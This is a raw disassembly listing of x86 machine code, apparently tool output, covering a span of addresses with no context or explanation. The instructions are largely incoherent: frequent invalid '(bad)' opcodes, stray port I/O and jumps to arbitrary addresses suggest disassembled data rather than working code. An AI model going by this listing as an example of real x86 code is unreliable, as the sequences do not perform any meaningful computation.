  41377e:	fdiv   DWORD PTR [edx-0x22bade4b]
  413784:	and    eax,0x3872b7dc
  413789:	rcr    DWORD PTR [ebx],0xc1
  41378c:	fild   WORD PTR [ebx+0x3d]
  41378f:	xor    DWORD PTR [ecx+eiz*2],0x8592028a
  413796:	sub    bl,ch
  413798:	lods   al,BYTE PTR ds:[esi]
  413799:	fisttp QWORD PTR [ebx]
  41379b:	mov    bh,BYTE PTR [edx+0x29]
  41379e:	(bad)  
  41379f:	clc    
  4137a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137a1:	sub    dl,BYTE PTR [ebx+edi*1]
  4137a4:	in     al,dx
  4137a5:	push   ecx
  4137a6:	jae    0x4137e2
  4137a8:	xor    ecx,DWORD PTR [eax]
  4137aa:	pop    edx
  4137ab:	mov    dl,0x28
  4137ad:	sbb    bh,BYTE PTR [esi-0x1707ba44]
  4137b3:	leave  
  4137b4:	mov    ebx,0x409eba76
  4137b9:	jb     0x41375a
  4137bb:	push   edx
  4137bc:	shr    eax,cl
  4137be:	cmp    ch,ch
  4137c0:	mov    esp,0xe88bdf6
  4137c5:	fst    QWORD PTR [edx+0x667339ab]
  4137cb:	jg     0x413754
  4137cd:	rcr    DWORD PTR [ebx],0x56
  4137d0:	fistp  DWORD PTR [ebx+0x32]
  4137d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137d4:	pop    ecx
  4137d5:	mov    esi,0x6f1db9c0
  4137da:	addr16 cli 
  4137dc:	fld    DWORD PTR [edx-0x49bc4146]
  4137e2:	xor    ebx,DWORD PTR [esi+0x6c98143c]
  4137e8:	dec    ecx
  4137e9:	das    
  4137ea:	mov    al,ds:0x5164d035
  4137ef:	mov    BYTE PTR [ebx],bl
  4137f1:	cmp    eax,0x40de1a04
  4137f6:	push   esi
  4137f7:	push   0x2008c409
  4137fc:	cmp    bh,ch
  4137fe:	mov    ch,bl
  413800:	xchg   esp,esi
  413802:	int3   
  413803:	daa    
  413804:	int3   
  413805:	loopne 0x4137aa
  413807:	xchg   ebx,eax
  413808:	xor    al,cl
  41380a:	popa   
  41380b:	sub    BYTE PTR [ebx+0x1b451c60],0xb9
  413812:	mov    ebp,DWORD PTR [eax+ebx*1]
  413815:	sub    al,0x21
  413817:	push   ds
  413818:	cdq    
  413819:	push   ebp
  41381a:	adc    al,0x38
  41381c:	adc    BYTE PTR [ebx+eiz*2],bl
  41381f:	dec    ebp
  413820:	call   DWORD PTR [ecx]
  413822:	fisttp WORD PTR [eax-0x312e7b7c]
  413828:	jl     0x4137f6
  41382a:	xor    eax,0x4cc58820
  41382f:	mov    esi,0x3b2f43a3
  413834:	cld    
  413835:	mov    eax,ds:0x9bce3f22
  41383a:	xor    al,0xb7
  41383c:	add    bl,BYTE PTR es:[ebx-0x67]
  413840:	xor    eax,DWORD PTR [esi+0x2f]
  413843:	xchg   esi,eax
  413844:	ins    DWORD PTR es:[edi],dx
  413845:	fs pop edx
  413847:	repnz mov ebp,0x1424dcb7
  41384d:	jbe    0x41383f
  41384f:	mov    ebp,0x42bd0c8a
  413854:	pop    ss
  413855:	fcomp  QWORD PTR [esi+edi*4+0x17dd8e43]
  41385c:	pop    ebp
  41385d:	xchg   edx,eax
  41385e:	mov    ah,0x30
  413860:	repz shr DWORD PTR [ebx],0x96
  413864:	cmp    DWORD PTR [edx+0x4e],esp
  413867:	mov    ?,WORD PTR [ecx+0x594d16a9]
  41386d:	rcl    DWORD PTR [eax+0x57],cl
  413870:	jl     0x41384a
  413872:	popa   
  413873:	push   0x19707a45
  413878:	sub    eax,0x809b26d3
  41387d:	mov    ds:0x7e855632,eax
  413882:	(bad)  
  413883:	out    dx,al
  413884:	aas    
  413885:	adc    dh,bh
  413887:	dec    ecx
  413888:	push   ebx
  413889:	adc    al,0x32
  41388b:	repnz in eax,dx
  41388d:	or     dh,BYTE PTR ds:[eax-0x4daa9cbc]
  413894:	xor    BYTE PTR ds:0x37531ee6,0x9c
  41389b:	xchg   edx,eax
  41389c:	cmc    
  41389d:	lahf   
  41389e:	cmp    eax,0xcf573d85
  4138a3:	add    BYTE PTR [ebx-0x8],bl
  4138a6:	or     BYTE PTR [edi],bh
  4138a8:	pop    eax
  4138a9:	add    eax,0xa4352c84
  4138ae:	add    DWORD PTR [ebp-0x986a78a],ebx
  4138b4:	mov    ch,0x78
  4138b6:	pop    esi
  4138b7:	ins    DWORD PTR es:[edi],dx
  4138b8:	push   ecx
  4138b9:	adc    al,0xaf
  4138bb:	xor    dh,BYTE PTR [edi-0x2ae8e34e]
  4138c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138c2:	and    esi,ebx
  4138c4:	mov    dh,0x4d
  4138c6:	adc    ebx,ebp
  4138c8:	pop    esp
  4138c9:	shl    DWORD PTR [esp+edi*8],cl
  4138cc:	mov    bl,0x9
  4138ce:	jns    0x413876
  4138d0:	and    ch,cl
  4138d2:	cld    
  4138d3:	sub    DWORD PTR [edx-0x3b],0xffffffa1
  4138d7:	mov    ds:0xe00ed3d1,al
  4138dc:	cli    
  4138dd:	jle    0x41390a
  4138df:	or     ah,dh
  4138e1:	aas    
  4138e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138e3:	int    0xef
  4138e5:	jbe    0x41391e
  4138e7:	cmp    dh,BYTE PTR [ecx+0x43]
  4138ea:	aad    0x41
  4138ec:	pop    esi
  4138ed:	std    
  4138ee:	jge    0x413904
  4138f0:	das    
  4138f1:	adc    edx,DWORD PTR [ecx+0x7c]
  4138f4:	sub    ah,ah
  4138f6:	mov    edi,0xb59277c5
  4138fb:	cs inc edx
  4138fd:	std    
  4138fe:	add    DWORD PTR [esi+esi*4],esp
  413901:	ret    
  413902:	call   0xe996f4b9
  413907:	test   DWORD PTR [edi],0x3842df41
  41390d:	dec    edx
  41390e:	adc    ah,BYTE PTR [edx-0x47]
  413911:	rep lods al,BYTE PTR ds:[esi]
  413913:	push   es
  413914:	push   cs
  413915:	and    DWORD PTR [ecx+0x33b3ea4e],ebp
  41391b:	add    BYTE PTR [ebx+0x15],0x35
  41391f:	in     al,0x9a
  413921:	out    0xfe,al
  413923:	adc    BYTE PTR [ebx],bl
  413925:	mov    cl,0x2b
  413927:	pop    ss
  413928:	repz sti 
  41392a:	jmp    FWORD PTR [ecx+0x78]
  41392d:	jmp    0x413905
  41392f:	push   ecx
  413930:	popf   
  413931:	lods   eax,DWORD PTR ds:[esi]
  413932:	and    al,0x5b
  413934:	rcr    DWORD PTR [ebp+0x46224107],1
  41393a:	and    eax,0x7caffc06
  41393f:	fwait
  413940:	rol    DWORD PTR [edx+0x2c5de491],1
  413946:	mov    ch,0xfe
  413948:	out    dx,al
  413949:	int3   
  41394a:	adc    eax,0xd0ebde3a
  41394f:	pushf  
  413950:	arpl   WORD PTR [ecx],dx
  413952:	int    0x91
  413954:	xchg   edi,eax
  413955:	clc    
  413956:	in     eax,0x84
  413958:	xchg   DWORD PTR [ebx+ecx*4-0x1d],eax
  41395c:	loopne 0x413936
  41395e:	lahf   
  41395f:	ss inc esp
  413961:	push   ebp
  413962:	js     0x413906
  413964:	test   BYTE PTR [ebx+0x49af1ab6],0xe7
  41396b:	nop
  41396c:	dec    ebx
  41396d:	nop
  41396e:	cmc    
  41396f:	mov    ch,0x76
  413971:	cmp    DWORD PTR [bx+0x76],0xd1c1b13e
  413979:	or     BYTE PTR [edx],ch
  41397b:	and    bl,BYTE PTR [ecx]
  41397d:	push   ecx
  41397e:	outs   dx,BYTE PTR es:[esi]
  413980:	popf   
  413981:	clc    
  413982:	push   esp
  413983:	push   edx
  413984:	js     0x41394b
  413986:	or     BYTE PTR [esi-0x4e48479b],al
  41398c:	pushf  
  41398d:	shl    DWORD PTR [bp-0x5280],0x73
  413993:	scas   al,BYTE PTR es:[edi]
  413994:	ja     0x4139d2
  413996:	repnz sbb al,cl
  413999:	cmp    cl,bl
  41399b:	adc    al,0x3d
  41399d:	mov    DWORD PTR [eax+0x75ad4691],ebp
  4139a3:	imul   esp,DWORD PTR [ecx],0xa7e81d86
  4139a9:	cmp    BYTE PTR [ecx+0x7a03e424],ch
  4139af:	mov    dl,0x16
  4139b1:	das    
  4139b2:	xchg   ecx,eax
  4139b3:	inc    edx
  4139b4:	push   edx
  4139b5:	ja     0x4139dc
  4139b7:	jb     0x413a27
  4139b9:	das    
  4139ba:	push   ss
  4139bb:	mov    ss,WORD PTR [edi]
  4139bd:	gs jmpw 0x22b3
  4139c2:	nop
  4139c3:	mov    dl,0x48
  4139c5:	mov    ch,0xc8
  4139c7:	jae    0x413a1a
  4139c9:	das    
  4139ca:	adc    cl,BYTE PTR [edx+0x2e911398]
  4139d0:	ficomp WORD PTR [edx+0x76a33039]
  4139d6:	mov    ds:0x7068b29,al
  4139db:	cmp    bh,BYTE PTR [edx+0x4a]
  4139de:	dec    ebp
  4139df:	ret    0xf3ae
  4139e2:	xchg   edx,eax
  4139e3:	cmp    al,0xac
  4139e5:	test   DWORD PTR [ecx-0x14],ecx
  4139e8:	out    dx,al
  4139e9:	test   eax,0xed14df5a
  4139ee:	rol    BYTE PTR [ebp+0x23],cl
  4139f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139f2:	jae    0x4139c9
  4139f4:	je     0x413a42
  4139f6:	enter  0x7491,0xf4
  4139fa:	xor    BYTE PTR [edi],al
  4139fc:	popf   
  4139fd:	int3   
  4139fe:	ss jno 0x413983
  413a01:	mov    edx,0xef2421b3
  413a06:	mov    al,0x17
  413a08:	mov    dh,0x84
  413a0a:	cdq    
  413a0b:	iret   
  413a0c:	dec    edi
  413a0d:	xor    DWORD PTR [esi+0x3e],esp
  413a10:	scas   eax,DWORD PTR es:[edi]
  413a11:	adc    al,bh
  413a13:	mov    bl,0xbb
  413a15:	in     eax,dx
  413a16:	add    eax,0x59350300
  413a1b:	(bad)  
  413a1c:	sar    BYTE PTR gs:[ebp+0x2b0f8c7a],1
  413a23:	out    0xe6,al
  413a25:	arpl   WORD PTR [edx+0x7a],bx
  413a28:	cli    
  413a29:	pop    ss
  413a2a:	into   
  413a2b:	adc    eax,0x1ac5695e
  413a30:	xchg   edx,eax
  413a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a32:	pop    ebp
  413a33:	lds    edx,FWORD PTR [eax-0x6f]
  413a36:	js     0x413a6f
  413a38:	sub    BYTE PTR ds:0xf7810ec0,0x5d
  413a3f:	retf   0x3f1a
  413a42:	ret    0x66bd
  413a45:	retf   0xc213
  413a48:	mov    eax,0x3c9c6438
  413a4d:	push   edi
  413a4e:	popa   
  413a4f:	mov    bh,0x4b
  413a51:	push   0xffffffeb
  413a53:	(bad)  
  413a54:	in     eax,dx
  413a55:	pop    eax
  413a56:	sbb    cl,cl
  413a58:	iret   
  413a59:	push   ebx
  413a5a:	mov    ds:0x4b291af5,eax
  413a5f:	sub    al,0xdc
  413a61:	mov    al,0xa0
  413a63:	push   eax
  413a64:	mov    ds:0xe533d43e,al
  413a69:	imul   ecx,DWORD PTR [esi],0x701f09fd
  413a6f:	lods   al,BYTE PTR ds:[esi]
  413a70:	(bad)  
  413a71:	nop
  413a72:	mov    ah,0x56
  413a74:	mov    WORD PTR [eax],fs
  413a76:	jg     0x413a52
  413a78:	adc    BYTE PTR [eax-0x1a],0x2b
  413a7c:	ficomp DWORD PTR [edx+ebx*2+0x14]
  413a80:	loop   0x413ac4
  413a82:	retf   
  413a83:	fwait
  413a84:	and    esp,DWORD PTR [edx]
  413a86:	out    0xff,eax
  413a88:	dec    edx
  413a89:	adc    eax,0xf30577c6
  413a8e:	test   BYTE PTR ds:0x3d503502,ch
  413a94:	out    0x8a,al
  413a96:	pop    edx
  413a97:	push   edi
  413a98:	clc    
  413a99:	cwde   
  413a9a:	mov    dl,0xbd
  413a9c:	es jge 0x413ab7
  413a9f:	cli    
  413aa0:	sbb    DWORD PTR [eax],esp
  413aa2:	inc    esi
  413aa3:	daa    
  413aa4:	add    eax,0x27961ceb
  413aa9:	jecxz  0x413a34
  413aab:	sub    DWORD PTR [ebx-0x1f],esi
  413aae:	in     al,dx
  413aaf:	ins    DWORD PTR es:[edi],dx
  413ab0:	mov    bl,0x5c
  413ab2:	ins    BYTE PTR es:[edi],dx
  413ab3:	or     ebp,ebx
  413ab5:	jo     0x413a3f
  413ab7:	jne    0x413a6e
  413ab9:	add    eax,0x7694eb78
  413abe:	inc    edx
  413abf:	pop    ebp
  413ac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ac1:	pop    ecx
  413ac2:	and    DWORD PTR [eax+esi*4],eax
  413ac5:	rcr    edx,0xf
  413ac8:	retf   0x75c4
  413acb:	or     BYTE PTR [edi+0x2b],bh
  413ace:	push   esp
  413acf:	dec    ebp
  413ad0:	into   
  413ad1:	lock jo 0x413b1e
  413ad4:	jge    0x413a84
  413ad6:	stos   DWORD PTR es:[edi],eax
  413ad7:	daa    
  413ad8:	jo     0x413ae3
  413ada:	push   ds
  413adb:	cmp    al,0xaf
  413add:	(bad)  
  413ade:	std    
  413adf:	rcl    BYTE PTR [ebx],cl
  413ae1:	lahf   
  413ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ae3:	fs stos BYTE PTR es:[edi],al
  413ae5:	jae    0x413a80
  413ae7:	outs   dx,BYTE PTR ds:[esi]
  413ae8:	jp     0x413abc
  413aea:	mov    ds:0xa99f9e97,eax
  413aef:	in     al,dx
  413af0:	(bad)  
  413af1:	sbb    al,0xd8
  413af3:	outs   dx,DWORD PTR ds:[esi]
  413af4:	cld    
  413af5:	adc    BYTE PTR [esp+ecx*8-0x3f],bh
  413af9:	push   ebp
  413afa:	inc    edi
  413afb:	sbb    cl,BYTE PTR [eax-0x3132afc6]
  413b01:	pop    ss
  413b02:	int    0xbb
  413b04:	mov    DWORD PTR [edx],esp
  413b06:	mov    WORD PTR [ebx+edx*1-0x2c],gs
  413b0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b0b:	clc    
  413b0c:	jmp    0x413b11
  413b0e:	retf   
  413b0f:	sahf   
  413b10:	icebp  
  413b11:	sbb    eax,0xb0159795
  413b16:	(bad)  
  413b17:	sub    esi,DWORD PTR [edx+0x76]
  413b1a:	enter  0xaea9,0x4
  413b1e:	(bad)  
  413b1f:	in     al,0xb0
  413b21:	pop    esi
  413b22:	test   eax,0xe96de3c0
  413b27:	mov    ebx,0xa5f3aad8
  413b2c:	clc    
  413b2d:	jae    0x413b3c
  413b2f:	mov    eax,ds:0xdf15128b
  413b34:	cld    
  413b35:	mov    cl,0x9b
  413b37:	scas   al,BYTE PTR es:[edi]
  413b38:	pop    eax
  413b39:	dec    ebp
  413b3a:	stc    
  413b3b:	add    eax,0xec18d56c
  413b40:	adc    eax,0xf4df8a5
  413b45:	push   0xfa90a9ae
  413b4a:	and    BYTE PTR [esi-0x63],0xd2
  413b4e:	sbb    esp,DWORD PTR [ebx*1-0x53a89a12]
  413b55:	mov    DWORD PTR [edi],ebp
  413b57:	pop    ss
  413b58:	int    0xec
  413b5a:	icebp  
  413b5b:	mov    cl,0x8e
  413b5d:	sub    eax,0x6ca23647
  413b62:	cld    
  413b63:	call   0x9a71:0x68c15bd9
  413b6a:	ss inc ebp
  413b6c:	push   cs
  413b6d:	loopne 0x413afe
  413b6f:	test   BYTE PTR [ebp+0x7c],bh
  413b72:	push   0x25
  413b74:	dec    esp
  413b75:	mov    BYTE PTR [ebx+esi*8],dh
  413b78:	neg    BYTE PTR [ecx-0x49c0e0e9]
  413b7e:	fcmovu st,st(5)
  413b80:	dec    ebp
  413b81:	retf   0xfe64
  413b84:	push   ebx
  413b85:	cmp    ch,dl
  413b87:	lahf   
  413b88:	imul   ecx
  413b8a:	(bad)  
  413b8b:	jne    0x413c06
  413b8d:	add    esp,DWORD PTR [edx]
  413b8f:	out    dx,eax
  413b90:	mov    esi,0x2483b346
  413b95:	add    ch,BYTE PTR [esi+0x29]
  413b98:	jmp    0xad72:0x27098ca5
  413b9f:	scas   eax,DWORD PTR es:[edi]
  413ba0:	in     eax,0x47
  413ba2:	mov    ecx,edi
  413ba4:	cdq    
  413ba5:	imul   ebx,DWORD PTR [esi-0x559c7638],0x15f61109
  413baf:	and    DWORD PTR [ecx-0x6bf8a262],ebp
  413bb5:	add    BYTE PTR [edx],bh
  413bb7:	jmp    0xf5f832a4
  413bbc:	mov    esi,0xe98a98ea
  413bc1:	or     ch,BYTE PTR [edi-0x51]
  413bc4:	xlat   BYTE PTR ds:[ebx]
  413bc5:	pop    edx
  413bc6:	(bad)  
  413bc8:	cmp    cl,BYTE PTR [edi+0x6cc55b54]
  413bce:	mov    bl,BYTE PTR [ebp-0x462662cf]
  413bd4:	shr    DWORD PTR [eax-0x2bc47e21],1
  413bda:	push   edi
  413bdb:	add    BYTE PTR [eax],bl
  413bdd:	les    ecx,FWORD PTR [ebx-0x28a8af29]
  413be3:	mov    esp,0x39f0bfd
  413be8:	push   ds
  413be9:	cli    
  413bea:	outs   dx,DWORD PTR ds:[esi]
  413beb:	xchg   esi,eax
  413bec:	gs mov edx,0xea5a0c28
  413bf3:	xor    BYTE PTR [ebx],al
  413bf5:	jb     0x413c2d
  413bf7:	inc    eax
  413bf8:	fst    DWORD PTR [ecx+0x5035827b]
  413bfe:	scas   al,BYTE PTR es:[edi]
  413bff:	rol    BYTE PTR [esi-0x75cf81ff],0xde
  413c06:	pop    eax
  413c07:	retf   
  413c08:	jmp    0x75cb503
  413c0d:	lock jno 0x413bf9
  413c10:	mov    ecx,0x177bcf4f
  413c15:	mov    bl,0xbf
  413c17:	bound  edi,QWORD PTR [edi-0xc94bf4e]
  413c1d:	repz xor BYTE PTR [edi],dl
  413c20:	push   es
  413c21:	dec    ebx
  413c22:	fdivr  DWORD PTR [edx]
  413c24:	dec    ebx
  413c25:	sub    DWORD PTR [ebx+0x2c],ebp
  413c28:	mov    ebx,0xd25d452
  413c2d:	and    dl,dl
  413c2f:	fmul   DWORD PTR [ecx]
  413c31:	push   0x5c1f9504
  413c36:	xor    BYTE PTR [ebp-0x42],ah
  413c39:	pop    esi
  413c3a:	xlat   BYTE PTR ds:[ebx]
  413c3b:	mov    ch,BYTE PTR [edx-0x4d1393]
  413c41:	xchg   esp,eax
  413c42:	ins    BYTE PTR es:[edi],dx
  413c43:	sub    eax,0xbcfc8b39
  413c48:	push   ecx
  413c49:	sbb    DWORD PTR [edi+0x7a0c7441],esp
  413c4f:	sbb    al,0x8d
  413c51:	push   ds
  413c52:	add    DWORD PTR [esi+0x324b95f9],esp
  413c58:	or     al,0x99
  413c5a:	sub    eax,0xc8fb5222
  413c5f:	sbb    edi,DWORD PTR [esp+esi*4+0x24]
  413c63:	ins    DWORD PTR es:[edi],dx
  413c64:	sbb    al,0x94
  413c66:	add    eax,0xdeb5ac87
  413c6b:	in     al,dx
  413c6c:	adc    BYTE PTR [ecx+0x19],cl
  413c6f:	or     al,0x99
  413c71:	mov    dl,BYTE PTR ds:0x6c5bcb73
  413c77:	jp     0x413c87
  413c79:	inc    edx
  413c7a:	xor    DWORD PTR [esi],ebx
  413c7c:	std    
  413c7d:	mov    ecx,0x3d307a64
  413c82:	mov    dl,0x26
  413c84:	or     eax,0xf5e19d8f
  413c89:	sub    bh,BYTE PTR [eax+0x5aa00f73]
  413c8f:	mov    ebp,0xb20a7d66
  413c94:	cmp    esi,DWORD PTR [ecx+eax*8-0x478fb64]
  413c9b:	dec    eax
  413c9c:	jp     0x413c86
  413c9e:	nop
  413c9f:	icebp  
  413ca0:	aad    0x5d
  413ca2:	lahf   
  413ca3:	scas   eax,DWORD PTR es:[edi]
  413ca4:	popf   
  413ca5:	inc    ebp
  413ca6:	cwde   
  413ca7:	adc    cl,ch
  413ca9:	test   eax,0xc254cb68
  413cae:	and    BYTE PTR [edx],bh
  413cb0:	inc    esi
  413cb1:	int3   
  413cb2:	cwde   
  413cb3:	adc    ah,BYTE PTR [ebx]
  413cb5:	sub    BYTE PTR [ebx],cl
  413cb7:	xchg   ecx,eax
  413cb8:	fdivr  DWORD PTR [esp+ecx*1+0x308c85d8]
  413cbf:	scas   eax,DWORD PTR es:[edi]
  413cc0:	dec    edi
  413cc1:	push   cs
  413cc2:	jb     0x413ca2
  413cc4:	sahf   
  413cc5:	mov    ecx,0x8dcf1378
  413cca:	imul   ebp,DWORD PTR [ecx+0x6e],0x7aa8d8e1
  413cd1:	ret    
  413cd2:	xlat   BYTE PTR ds:[ebx]
  413cd3:	sub    DWORD PTR [ebp+0x33],ebx
  413cd6:	rcl    BYTE PTR [ebp-0x1],0x37
  413cda:	mov    ebp,0x4b46a234
  413cdf:	dec    esi
  413ce0:	add    BYTE PTR [ecx],dl
  413ce2:	cmp    eax,0xa97a347e
  413ce7:	in     al,dx
  413ce8:	dec    eax
  413ce9:	outs   dx,BYTE PTR ds:[esi]
  413cea:	lods   eax,DWORD PTR ds:[esi]
  413ceb:	clts   
  413ced:	fcmovb st,st(6)
  413cef:	xor    BYTE PTR [ebx],ah
  413cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cf2:	arpl   WORD PTR [eax],di
  413cf4:	or     ebp,DWORD PTR ds:0xbaf2f4d8
  413cfa:	leave  
  413cfb:	clc    
  413cfc:	and    ah,dl
  413cfe:	ins    DWORD PTR es:[edi],dx
  413cff:	mov    cl,0x97
  413d01:	je     0x413d32
  413d03:	sar    DWORD PTR [esi-0x1b],cl
  413d06:	xchg   ebp,eax
  413d07:	push   esi
  413d08:	inc    esi
  413d09:	push   edx
  413d0a:	cmp    eax,0xac70bbab
  413d0f:	jmp    DWORD PTR ss:0xa1813bc6
  413d16:	and    al,0xcf
  413d18:	jle    0x413c9e
  413d1a:	xchg   edi,eax
  413d1b:	in     eax,dx
  413d1c:	cmp    al,0xf4
  413d1e:	mov    ebp,0xf3b88761
  413d23:	sub    esi,DWORD PTR [edi-0x2e]
  413d26:	xchg   ah,ah
  413d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d29:	push   ecx
  413d2a:	add    eax,0x259c5c02
  413d2f:	shl    DWORD PTR [edx-0x49],0x4e
  413d33:	les    edi,FWORD PTR [edi+0x697431a6]
  413d39:	nop
  413d3a:	or     eax,0x752884d1
  413d3f:	in     al,dx
  413d40:	out    dx,eax
  413d41:	(bad)  
  413d42:	pop    eax
  413d43:	mov    ah,0x3
  413d45:	add    eax,0x31051249
  413d4a:	dec    esp
  413d4b:	jo     0x413d75
  413d4d:	mov    cl,0x4f
  413d4f:	pop    es
  413d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d51:	loop   0x413cd9
  413d53:	xor    DWORD PTR [ecx+0x72],edi
  413d56:	in     al,dx
  413d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d58:	mov    ah,0xd9
  413d5a:	dec    ecx
  413d5b:	push   es
  413d5c:	test   BYTE PTR [ebx+ecx*1-0x42],0xa2
  413d61:	(bad)  
  413d62:	in     al,0x9b
  413d64:	ret    0xb953
  413d67:	test   edi,0x6518e8ad
  413d6d:	sub    esi,esi
  413d6f:	shl    BYTE PTR [ebx-0x53],cl
  413d72:	mov    eax,ds:0x5397e32a
  413d77:	sbb    BYTE PTR [eax+eax*4],0x28
  413d7b:	out    dx,eax
  413d7c:	and    edx,DWORD PTR [ecx*8+0x3dcb2c73]
  413d83:	jg     0x413df9
  413d85:	sub    dh,BYTE PTR [esi-0x23374165]
  413d8b:	jmp    0x413d62
  413d8d:	(bad)  
  413d8e:	xor    dh,BYTE PTR [edi+0x421324e3]
  413d94:	pop    esp
  413d95:	adc    eax,0x2bcb605d
  413d9a:	pushf  
  413d9b:	leave  
  413d9c:	push   edx
  413d9d:	retf   0xc8a6
  413da0:	mov    ah,0x15
  413da2:	push   edi
  413da3:	mov    eax,0x6ca5c10f
  413da8:	sub    al,0x79
  413daa:	xor    ah,bl
  413dac:	mov    ch,0x2e
  413dae:	cld    
  413daf:	leave  
  413db0:	imul   BYTE PTR [ebx+0x60c6386b]
  413db6:	xor    al,0xfa
  413db8:	sbb    eax,0x9fa7c577
  413dbd:	push   es
  413dbe:	sbb    bl,BYTE PTR [esi-0x153563dd]
  413dc4:	xchg   esp,eax
  413dc5:	(bad)  
  413dc6:	into   
  413dc7:	jmp    DWORD PTR [ebx-0x29]
  413dca:	add    al,0x1b
  413dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dcd:	rol    DWORD PTR [eax+0x6355bd24],cl
  413dd3:	mov    esp,0xca61fa7a
  413dd8:	xchg   DWORD PTR [esi+0x5c96b469],ebp
  413dde:	jbe    0x413d86
  413de0:	or     al,0x2d
  413de2:	xor    esp,edx
  413de4:	in     eax,0x38
  413de6:	aad    0x85
  413de8:	in     eax,0xcb
  413dea:	out    dx,al
  413deb:	test   DWORD PTR [esi-0x26],ebx
  413dee:	rcl    BYTE PTR [eax+0x3d71a6a9],1
  413df4:	sub    bh,BYTE PTR [edi-0x17ba2b4e]
  413dfa:	outs   dx,BYTE PTR ds:[esi]
  413dfb:	add    ch,BYTE PTR [edx]
  413dfd:	or     DWORD PTR [ecx+0x22],eax
  413e00:	adc    DWORD PTR [ebx-0x58],edi
  413e03:	mov    BYTE PTR [ebp-0x1166b3f],dh
  413e09:	ins    BYTE PTR es:[edi],dx
  413e0a:	pop    esp
  413e0b:	rcr    DWORD PTR [edx-0x40f314de],cl
  413e11:	push   ds
  413e12:	aad    0x36
  413e14:	jne    0x413de6
  413e16:	xchg   edx,eax
  413e17:	sub    dh,BYTE PTR [ebp+0x53]
  413e1a:	xchg   BYTE PTR [edx+0x49],ah
  413e1d:	dec    edx
  413e1e:	sub    al,0xc6
  413e20:	cmp    BYTE PTR ss:[esi],bl
  413e23:	mov    ds:0x42e37a31,eax
  413e28:	add    al,0x9e
  413e2a:	push   esi
  413e2b:	shr    BYTE PTR [esi+0x79bccdea],cl
  413e31:	mov    al,0x26
  413e33:	xor    ecx,DWORD PTR [ebp+0x12]
  413e36:	arpl   WORD PTR [ebp+0x38fa96bd],di
  413e3c:	add    al,0x2a
  413e3e:	inc    ecx
  413e3f:	(bad)  
  413e40:	and    edx,DWORD PTR [ecx+esi*2+0x7d86fd2a]
  413e47:	loope  0x413e2b
  413e49:	inc    esi
  413e4a:	in     al,dx
  413e4b:	mov    cl,0x20
  413e4d:	mov    bh,bh
  413e4f:	popa   
  413e50:	push   esp
  413e51:	scas   eax,DWORD PTR es:[edi]
  413e52:	les    edx,FWORD PTR [eax]
  413e54:	jmp    0x413e0b
  413e56:	mov    ecx,0xb99a6382
  413e5b:	rcl    DWORD PTR [eax+0x6a],1
  413e5e:	fwait
  413e5f:	dec    edx
  413e60:	es xchg esi,eax
  413e62:	xchg   ebp,eax
  413e63:	jno    0x413ec2
  413e65:	stc    
  413e66:	aas    
  413e67:	adc    eax,0x793d7a93
  413e6c:	or     DWORD PTR [ecx+0x0],0xbc7e583f
  413e73:	mov    ds:0x6bf388b,eax
  413e78:	cmp    cl,BYTE PTR [edx+0x295e2573]
  413e7e:	retf   0xa836
  413e81:	cmp    BYTE PTR [esi+eiz*2],al
  413e84:	pop    eax
  413e85:	scas   eax,DWORD PTR es:[edi]
  413e86:	or     ebx,DWORD PTR [ebx-0x79b21a79]
  413e8c:	jnp    0x413eb6
  413e8e:	mov    ah,0xa3
  413e90:	sbb    dh,BYTE PTR ds:0x4a0bbeef
  413e96:	sub    eax,0xabd763e
  413e9b:	hlt    
  413e9c:	pop    ss
  413e9d:	ins    BYTE PTR es:[edi],dx
  413e9e:	out    dx,al
  413e9f:	mov    dl,0x8
  413ea1:	sti    
  413ea2:	call   0xf82fd6ed
  413ea7:	idiv   eax
  413ea9:	xlat   BYTE PTR ds:[ebx]
  413eaa:	inc    edx
  413eab:	(bad)  
  413eac:	fisttp QWORD PTR [esi-0x20]
  413eaf:	or     bh,BYTE PTR [edi]
  413eb1:	mov    bl,0xfd
  413eb3:	push   esp
  413eb4:	push   es
  413eb5:	and    ch,BYTE PTR [edi+0x1c]
  413eb8:	sub    dl,bl
  413eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ebb:	pop    es
  413ebc:	nop
  413ebd:	mov    dh,0xba
  413ebf:	jnp    0x413e88
  413ec1:	push   ebp
  413ec2:	cmp    cl,ch
  413ec4:	imul   ecx,DWORD PTR [ebx],0xdecc62ab
  413eca:	dec    ebp
  413ecb:	xchg   esp,eax
  413ecc:	lahf   
  413ecd:	fild   WORD PTR [eax-0x6a69f30f]
  413ed3:	fdivr  QWORD PTR [esi]
  413ed5:	mul    DWORD PTR [ebp-0x3153fb3a]
  413edb:	aad    0x6c
  413edd:	pextrw eax,mm4,0x19
  413ee1:	xor    esi,DWORD PTR [eax]
  413ee3:	cld    
  413ee4:	ficomp WORD PTR [ebx]
  413ee6:	fstp   QWORD PTR [esp+eax*2+0x29]
  413eea:	mov    ch,0x53
  413eec:	adc    eax,0x8a4bce11
  413ef1:	sbb    BYTE PTR [edx],al
  413ef3:	mov    ebx,DWORD PTR [edx-0x31]
  413ef6:	lahf   
  413ef7:	and    ecx,DWORD PTR [ebx+0x18c02092]
  413efd:	mov    WORD PTR [ebx],ds
  413eff:	(bad)  
  413f01:	test   BYTE PTR [ebx+0x3a49748f],bh
  413f07:	or     ah,al
  413f09:	test   BYTE PTR [ebx-0x58a94031],0x6
  413f10:	or     cl,BYTE PTR [ecx-0x50]
  413f13:	jmp    0x1a69a891
  413f18:	push   esi
  413f19:	xor    eax,0xc27cebf
  413f1e:	lea    ecx,[eax]
  413f20:	jne    0x413f9c
  413f22:	jns    0x413f1b
